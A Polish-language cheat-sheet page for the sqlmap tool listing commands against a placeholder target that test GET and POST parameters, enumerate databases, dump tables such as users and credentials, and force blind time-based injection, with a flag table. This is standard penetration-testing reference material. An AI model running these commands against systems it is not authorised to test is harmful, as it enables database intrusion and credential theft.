---
title: sqlmap
sidebar_position: 9
tags: [tool, exploitation, sql-injection]
---

> **Jedno zdanie:** Automatyczne narzędzie do wykrywania i exploitowania SQL injection, które może enumerować bazy danych i zrzucać tabele.

## Kiedy używać

- Testowanie parametru GET lub POST pod kątem SQL injection
- Enumerowanie struktury bazy danych po potwierdzeniu podatnego wejścia
- Zrzucanie zawartości tabel (np. użytkowników, danych uwierzytelniających)
- Scenariusze blind injection, gdzie nie jest zwracane widoczne wyjście

## Kluczowe komendy

```bash
# Wstrzyknięcie oparte na GET
sqlmap -u "http://target/search?q=test" --batch --level=3 --risk=2 --dbs

# Wstrzyknięcie oparte na POST
sqlmap -u "http://target/login" --data="username=admin&password=test" --batch --level=3 --risk=2

# Skan uwierzytelniony (dodaj ciasteczko sesji)
sqlmap -u "http://target/search?q=test" --cookie="session=abc123" --batch --dbs

# Enumeruj bazy danych
sqlmap -u "http://target/search?q=test" --batch --dbs

# Zrzuć określoną tabelę
sqlmap -u "http://target/search?q=test" -D database_name -T users --dump

# Wymuś technikę blind time-based
sqlmap -u "http://target/search?q=test" --technique=T --batch
```

### Kluczowe flagi

| Flag | Meaning |
|------|---------|
| `--batch` | Brak interaktywnych monitów — użyj domyślnych wartości |
| `--level` | Głębokość testowania 1–5 (wyższy = więcej payloadów) |
| `--risk` | Agresywność 1–3 (wyższy = bardziej destrukcyjne payloady) |
| `--dbs` | Enumeruj wszystkie bazy danych |
| `-D` / `-T` | Wskaż docelową bazę danych / tabelę |
| `--dump` | Wydobądź zawartość tabeli |
| `--technique=T` | Użyj tylko blind time-based injection |
| `--cookie` | Przekaż ciasteczko sesji do testowania uwierzytelnionego |

:::tip 💡 Pamiętaj
Zacznij od `--level=3 --risk=2` — level 1 pomija wiele realnych punktów wstrzyknięcia, ale level 5 risk 3 może uszkodzić dane.
:::
